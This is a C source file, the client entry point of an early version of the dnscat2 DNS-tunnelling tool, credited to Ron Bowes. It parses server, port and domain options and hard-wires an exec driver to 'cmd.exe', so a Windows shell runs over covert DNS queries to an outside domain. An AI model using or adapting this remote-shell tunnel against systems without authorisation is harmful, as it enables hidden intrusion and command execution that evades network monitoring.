/* dnscat.c
 * Created March/2013
 * By Ron Bowes
 */
#include <assert.h>
#include <ctype.h>
#include <errno.h>
#include <getopt.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <sys/socket.h>

#include "buffer.h"
#include "dns.h"
#include "driver_console.h"
#include "driver_dns.h"
#include "driver_exec.h"
#include "log.h"
#include "memory.h"
#include "message.h"
#include "select_group.h"
#include "session.h"
#include "sessions.h"
#include "udp.h"

/* Default options */
#define VERSION "0.00"

/* The max length is a little complicated:
 * 255 because that's the max DNS length
 * Halved, because we encode in hex
 * Minus the length of the domain, which is appended
 * Minus 1, for the period right before the domain
 * Minus the number of periods that could appear within the name
 */
#define MAX_DNSCAT_LENGTH(domain) ((255/2) - strlen(domain) - 1 - ((MAX_DNS_LENGTH / MAX_FIELD_LENGTH) + 1))

select_group_t *group = NULL;

static void cleanup()
{
  message_t *message = message_create_destroy();
  message_post(message);
  message_destroy(message);

  LOG_WARNING("Terminating");

  sessions_destroy();
  if(group)
    select_group_destroy(group);

  print_memory();
}

void usage(char *name)
{
  fprintf(stderr,
"Usage: %s [args] <domain>\n"
"\n"

"General options:\n"
" --help -h               This page\n"
" --name -n <name>        Give this connection a name, which will show up in\n"
"                         the server list\n"
" --exec -e <process>     Execute the given process across the DNS connection\n"
/*" -L <port:host:hostport> Listen on the given port, and send the connection\n"*/
/*"                         to the given host on the given port\n"*/
/*" -D <port>               Listen on the given port, using the SOCKS protocol\n"*/
"\n"

"DNS-specific options:\n"
" --host <host>           The DNS server [default: system DNS]\n"
" --port <port>           The DNS port [default: 53]\n"
"\n"

"Debug options:\n"
" --trace-packets         Display the packets as they come and go\n"
, name
);
}

int main(int argc, char *argv[])
{
  /* Define the options specific to the DNS protocol. */
  struct option long_options[] =
  {
    /* General options */
    {"help",    no_argument,       0, 0}, /* Help */
    {"h",       no_argument,       0, 0},
    {"name",    required_argument, 0, 0}, /* Name */
    {"n",       required_argument, 0, 0},
    {"exec",    required_argument, 0, 0}, /* Execute */
    {"e",       required_argument, 0, 0},

    /* DNS-specific options */
    {"host",    required_argument, 0, 0}, /* DNS server */
    {"port",    required_argument, 0, 0}, /* DNS port */

    /* Debug options */
    {"trace-packets", no_argument, 0, 0}, /* Trace packets */
    {0,         0,                 0, 0}  /* End */
  };
  char              c;
  int               option_index;
  const char       *option_name;
  /*driver_console_t *driver_console;*/
  driver_exec_t    *driver_exec;
  driver_dns_t     *driver_dns;


  group = select_group_create();
  /*driver_console = driver_console_create(group);*/
  driver_exec    = driver_exec_create(group, "cmd.exe");
  driver_dns     = driver_dns_create(group);

  srand(time(NULL));

  /* Set the default log level */
  log_set_min_console_level(LOG_LEVEL_WARNING);

  /* Parse the command line options. */
  opterr = 0;
  while((c = getopt_long_only(argc, argv, "", long_options, &option_index)) != EOF)
  {
    switch(c)
    {
      case 0:
        option_name = long_options[option_index].name;

        /* General options */
        if(!strcmp(option_name, "help") || !strcmp(option_name, "h"))
        {
          usage(argv[0]);
          exit(0);
        }
        else if(!strcmp(option_name, "name"))
        {
          /* TODO: Handle 'name' again */
          /*options->name = optarg;*/
        }
        else if(!strcmp(option_name, "exec") || !strcmp(option_name, "e"))
        {
          /* TODO: Make this work again */
          /*options->exec = optarg;*/
        }

        /* DNS-specific options */
        else if(!strcmp(option_name, "host"))
        {
          driver_dns->dns_host = optarg;
        }
        else if(!strcmp(option_name, "port"))
        {
          driver_dns->dns_port = atoi(optarg);
        }

        /* Debug options */
        else if(!strcmp(option_name, "trace-packets"))
        {
          trace_packets = TRUE;
        }
        else
        {
          LOG_FATAL("Unknown option");
          /* TODO: Usage */
        }
        break;

      case '?':
      default:
        /* Do nothing; we expect some unknown arguments. */
        break;
    }
  }

  /* Make sure they gave a domain. */
  if(optind >= argc)
  {
    usage(argv[0]);
    exit(1);
  }
  driver_dns->domain = argv[optind];

  /* TODO: Set the session name, if necessary. */
#if 0
  if(options->name)
    session_set_name(options->session, options->name);
  else
    session_set_name(options->session, "dnscat2 "VERSION);
#endif

  /* Be sure we clean up at exit. */
  atexit(cleanup);

  /* Kick things off */
  message_post_start();

  while(TRUE)
    select_group_do_select(group, 1000);

  return 0;
}
